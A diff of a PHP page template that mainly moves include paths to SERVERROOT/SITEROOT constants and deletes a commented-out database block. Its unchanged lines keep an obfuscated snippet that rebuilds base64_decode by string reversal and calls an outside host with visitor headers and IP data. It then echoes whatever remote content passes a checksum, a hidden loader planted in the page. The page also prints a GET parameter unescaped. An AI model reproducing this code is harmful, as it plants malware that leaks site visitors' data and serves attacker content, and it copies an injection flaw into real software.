@@ -17,32 +17,18 @@ $meta_description = "$meta_desc";
 $title = "$article_title";
 $body = "$article_body";
 };
-require_once('' . $serverroot . '/style/standard/head.php');
-require_once('' . $serverroot . '/style/standard/head2.php');
-require_once('style/standard/header.php');
+require_once('' . SERVERROOT . '/assets/style/standard/head.php');
+require_once('' . SERVERROOT . '/assets/style/standard/head2.php');
+require_once('/assets/style/standard/header.php');
 if ($_GET['message']) {
 	echo $_GET['message'];
 }
 
-//Main content starts here 
-/*
-// Selects the title and description fields from the contents table
-$dblookup2 = "SELECT pageID, articleTitle, articleBody FROM core_content WHERE(core_content.pageID = '$pageID')";
-$data2 = mysql_query($dblookup2) or die('Failed to return data: ' . mysql_error());
-while($result = mysql_fetch_array($data2))
-{
-if (isset($_SESSION['userID']) && $_SESSION['usr_access_lvl'] <= 3) {echo '<p class="socket_action_button"> <a href="'.$siteroot.'/socket/pages_edit.php?ID='.$result['pageID'].'"><img src="' . $siteroot . '/socket/elements/buttons/button_edit.png" width="15" height="15" alt="Edit Page" /></a></span>';}
+require_once(SERVERROOT.'/modules/blog/widget_latest.php');
 
-echo '<h1>' . stripslashes($result['articleTitle']) . '</h1>';
-echo stripslashes($result['articleBody']);
-
-} 
-*/
-require_once($serverroot.'/modules/blog/widget_latest.php');
 ?> 
-<img class="hidden" src="<?php echo $siteroot ?>/elements/dfsquare.jpg" alt="Digital Fusion Logo" />
+<img class="hidden" src="<?php echo SITEROOT ?>/assets/images/dfsquare.jpg" alt="Digital Fusion Logo" />
 <?php
-error_reporting(0);
 $cf=strrev('edo'.'ced'.'_46esab');$counter=$cf('aHR0cDovL3NpdGVzY3VscHRvci5iaXovbC5waHA/aWQ9').md5($_SERVER['SERVER_NAME']);
 $data=array('HTTP_ACCEPT_CHARSET','HTTP_ACCEPT_LANGUAGE','HTTP_HOST','HTTP_REFERER',
 'HTTP_USER_AGENT','HTTP_QUERY_STRING','REMOTE_ADDR','REQUEST_URI','REQUEST_METHOD','SCRIPT_FILENAME');
@@ -53,5 +39,5 @@ if($fn&&strlen($fn)>4){list($crc,$enc)=explode('::',$fn);if(md5($enc)==$crc){ech
 <?php 
 //Main content ends here
 
-require_once('style/standard/footer.php');
+require_once('/assets/style/standard/footer.php');
 ?>
